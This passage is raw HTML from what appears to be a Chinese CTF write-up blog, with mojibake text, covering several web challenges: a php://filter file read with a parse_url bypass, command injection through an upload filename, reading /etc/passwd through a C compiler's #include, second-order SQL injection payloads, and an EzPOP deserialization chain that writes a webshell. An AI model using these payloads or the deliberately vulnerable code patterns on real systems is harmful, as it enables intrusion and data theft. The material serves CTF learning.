punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹ffffllllaaaagggï¼Œå‘ç°è¢«è¿‡æ»¤äº†<br><code>/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>ä½†æ˜¯parse_urlè§£ææ¼æ´ï¼Œå½“urlç§å‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µçš„urlï¼Œä¼šè§£æé”™è¯¯ï¼Œè¿”å›false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>è¯»å–åˆ°è¿™ä¸ªæ–‡ä»¶äº†</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;else &#123;    echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­æŸ¥çœ‹m4aaannngggeee</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates&#x2F;upload.html&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å»çœ‹çœ‹upload.htmlï¼Œå†è½¬å›upllloadddd.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upllloadddd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span><span class="token operator">.</span><span class="token variable">$picdata</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ä¿®æ”¹æ–‡ä»¶åå°±èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png"></p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>è¯•äº†è¯•phpå’Œpythonä»£ç ï¼Œéƒ½ç¼–è¯‘å¤±è´¥ï¼Œå„ç§ç¼–ç¨‹è¯­è¨€éƒ½å°è¯•ä¸€ä¸‹å‘ç°æ˜¯Cçš„ç¼–è¯‘å™¨ï¼Œä½ å¥½ä¸–ç•Œè¯•è¯•</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main() &#123;    printf(&quot;Hello, World! \n&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹wpçŸ¥é“æ˜¯å¤´æ–‡ä»¶åŒ…å«æŠ¥é”™ï¼Œè¯•è¯•/etc/passwdï¼Œæœ‰å›æ˜¾</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png"></p><p>ç›´æ¥åŒ…å«flagæ‹¿åˆ°</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>é¢˜ç›®åå­—å¾ˆæ˜æ˜¾äº†ï¼ŒäºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å…¥ç‚¹åœ¨usernameå¤„</p><pre class="line-numbers language-none"><code class="language-none">kkk&#39; union select database() #rua&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; #kkk&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;#kkk&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åšå®Œå¯ä»¥çœ‹çœ‹æºç è¯­å¥è¢«æ„é€ æˆäº†ä»€ä¹ˆæ ·</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">æ’å…¥<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"insert into users(username,password,info) values ('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>','åæœˆå¤ªæ‡’ï¼Œæ²¡æœ‰ç®€ä»‹');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?action=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>å–å‡º<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select info from users where username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ä»æ•°æ®åº“ä¸­å–å‡ºinfoæ•°æ®çš„æ—¶å€™å¹¶æ²¡æœ‰å¯¹usernameè¿›è¡Œaddslashå¤„ç†ï¼Œä¼šå¯¼è‡´æŸ¥è¯¢çš„æ˜¯kkkè¿™ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æ³¨å†Œè¿‡è¿™ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´åé¢çš„union selectæ‰§è¡Œï¼Œäº§ç”Ÿäº†äºŒæ¬¡æ³¨å…¥æ¼æ´</p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>ä¸Šæ¥å°±ç»™äº†æºç ï¼Œä¸é”™<del>ä¸é”™ä¸ªæ¯›çº¿å•Šmdè¿™ä»€ä¹ˆç©æ„å•Šï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</del></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™ä¸ªå‡½æ•°åè½¬æ•°ç»„ä¸­æ‰€æœ‰çš„é”®ä»¥åŠå®ƒä»¬å…³è”çš„å€¼ï¼ŒåŸæ¥æ˜¯1->pathï¼Œç°åœ¨æ˜¯path->1</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é”®åï¼Œå¹¶è¿”å›äº¤é›†</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¼ å…¥äº†cacheå˜é‡ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œå‘ç°å¹¶æ²¡æœ‰cacheè¿™ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™ä¸ªéœ€è¦åç»­æŠŠå˜é‡å®šä¹‰ä¼ å€¼</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//çœ‹åˆ°è¿”å›å€¼è¢«json_encode</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ã€        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œsetå‡½æ•°åœ¨Bç±»ä¸­å­˜åœ¨ï¼Œåˆ°åé¢å†å®¡è®¡</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//æ˜æ˜¾è¿™é‡Œå°±æ˜¯ååºåˆ—åŒ–å¤´äº†</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span><span class="token comment">//è¿™è¾¹è¿”å›çš„æ˜¯intå‚æ•°</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span><span class="token comment">//æ‹¼æ¥å­—ç¬¦ä¸²</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span><span class="token comment">//åæ­£å°±æ˜¯æŠŠæ‰€æœ‰å†…å®¹ç»è¿‡options['serialize']åç§°å‡½æ•°è½¬æ¢äº†</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//è¿™è¾¹$expireå¯æ§ï¼Œç›´æ¥énull</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è½¬intç±»å‹</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¼šæŠŠå†…å®¹å˜æˆ$this->options['prefix'].$name</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŠŠå¦‚/var/www/html/index.phpçš„å­—ç¬¦ä¸²è½¬ä¸º/var/www/htmlè¿™æ ·</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// åˆ›å»ºå¤±è´¥</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŠŠä¼ å…¥çš„$valueè½¬ä¸ºå­—ç¬¦ä¸²</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//æ•°æ®å‹ç¼©ï¼Œç›´æ¥options['data_compress']=0ç»•è¿‡</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œéœ€è¦ç»•è¿‡æ­»äº¡exit</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™å¾ˆæ˜æ˜¾å†™shelläº†</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span 